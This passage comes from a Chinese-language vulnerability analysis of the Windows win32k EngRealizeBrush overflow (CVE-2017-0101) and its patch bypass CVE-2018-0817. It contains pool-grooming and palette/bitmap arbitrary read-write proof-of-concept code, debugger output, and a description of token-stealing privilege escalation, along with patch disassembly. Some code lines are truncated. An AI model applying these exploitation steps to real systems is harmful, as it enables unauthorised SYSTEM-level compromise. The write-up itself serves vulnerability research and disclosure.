    93af503d 8bf0            mov     esi,eax
    kd> !pool eax
    Pool page fddd3e00 region is Paged session pool
     fddd3000 size:  df8 previous size:    0  (Allocated)  Gh15
    *fddd3df8 size:  1f0 previous size:  df8  (Allocated) *Gh18
            Pooltag Gh18 : GDITAG_HMGR_PAL_TYPE, Binary : win32k.sys
     fddd3fe8 size:   18 previous size:  1f0  (Allocated)  Ustx Process: 87151620
_调色板对象被分配到预留的内存空间_
通过系统函数 `UnregisterClass` 对先前注册的窗口类对象取消注册。
    BOOL WINAPI UnregisterClass(
      _In_     LPCTSTR   lpClassName,
      _In_opt_ HINSTANCE hInstance
    );
_函数 UnregisterClass 的定义_
函数的第 1 个参数 `lpClassName` 指向窗口类名称字符串，与前面注册时传入的类名成字符串成员域对应。第 2 个参数 `hInstance`
是指向创建窗口类的模块的句柄。由于我们在创建时未指定模块句柄，因此该参数传 `NULL` 即可。在窗口类对象序列中挖出空洞的验证代码如下：
    CHAR buf[0x10] = { 0 };
    for (LONG i = 1000; i  !pool eax
    Pool page fccebff0 region is Paged session pool
     fcceb000 size:  df8 previous size:    0  (Allocated)  Gh15
     fccebdf8 size:  1f0 previous size:  df8  (Allocated)  Gh18
    *fccebfe8 size:   18 previous size:  1f0  (Allocated) *Gebr
            Pooltag Gebr : Gdi ENGBRUSH
_目标 ENGBRUSH 对象已命中预留的内存空洞_
漏洞触发后，由于溢出覆盖将位图表面对象的 `SURFACE->so.sizlBitmap.cy` 成员域覆盖成 `0x6`
数值，导致可控的位图像素数据范围扩大，因此可以通过系统函数 `GetBitmapBits`
请求获取超过其原有像素数据范围的数据。函数返回实际获取到的像素数据长度，如果传入参数的句柄指向的位图表面对象是正常的未被污染的位图对象，函数返回原本的位图数据范围；如果参数句柄指向被污染的目标位图对象，函数将返回根据参数的数值能够获取到的数据长度。根据该性质可获取紧随目标位图对象其后的调色板
`PALETTE` 对象的成员数据并定位目标位图对象的句柄。定位和获取的验证代码如下：
    pBmpHunted = (PDWORD)malloc(0x1000);
    ZeroMemory(pBmpHunted, 0x1000);
    LONG index = -1;
    for (LONG i = 0; i  4
        pvTable = malloc(cbSize);
        ZeroMemory(pvTable, cbSize);
        memcpy(pvTable, pvBits, cb);
        iLeng = SetPaletteEntries(hPalExtend, 0, cbSize / 4, (PPALETTEENTRY)pvTable);
        free(pvTable);
    }
_利用调色板对象任意地址写入的验证代码片段_
利用调色板对象任意内存地址读取的代码与之类似。接下来通过实现的任意读写接口，替换当前验证代码进程的 `EPROCESS` 结构的 `TOKEN`
指针为系统进程的 `TOKEN` 指针，实现特权提升的目的，并修复被损坏的 `POOL_HEADER` 结构和目标位图表面 `SURFACE`
对象的相关成员域，以使当前进程能够安全退出。
_启动的命令提示符进程已属于 System 用户特权_
* * *
**CVE-2018-0817**
在内核函数 `EngRealizeBrush` 中计算指定内存分配大小的变量的数值时，漏洞 CVE-2017-0101
的补丁程序虽然增加了防止发生整数溢出的校验函数，但是遗漏了在函数向内存分配函数调用传递参数时对 `v16 + 0x40`
计算语句的校验。然而漏洞验证代码恰可以利用这个遗漏来触发漏洞，造成补丁绕过，漏洞验证代码和利用代码因此在已安装最新安全补丁的 Windows 7 至
Windows 10 操作系统环境中仍旧能够成功触发和提权。
微软在 2018 年 3 月安全公告中公布了新的 CVE-2018-0817
漏洞，并且在安全公告所发布的安全更新中已包含修复该漏洞的补丁程序。补丁程序为函数 `EngRealizeBrush` 中的 `ulSizeTotal +
0x40` 计算语句位置增加了 `ULongAdd` 校验函数：
    lea     eax, [ebp+ulBufferBytes]
    push    eax
    push    dword ptr [ebp+ulSizeTotal]
    push    40h
    call    ?ULongAdd@@YGJKKPAK@Z
    test    eax, eax
    jl      loc_BF83E8B4
    [...]
    mov     ebx, [ebp+ulBufferBytes]
    [...]
    push    'rbeG'          ; Tag
    push    ebx             ; size_t
    call    _PALLOCMEM@8    ; PALLOCMEM(x,x)
    mov     esi, eax
    mov     [ebp+var_38], eax
_漏洞 CVE-2018-0817 的补丁程序增加校验函数_
#### 0x4 链接
本分析的 POC 下载
Windows 2000 图形驱动程序设计指南
GDI Palette Objects Local Privilege Escalation (MS17-017)
Logical Brush Types 
ICM-Enabled Bitmap Functions
Windows Color System
DrvRealizeBrush function
GDI Support Services
sensepost / gdi-palettes-exp
GDI Support for Palettes
* * *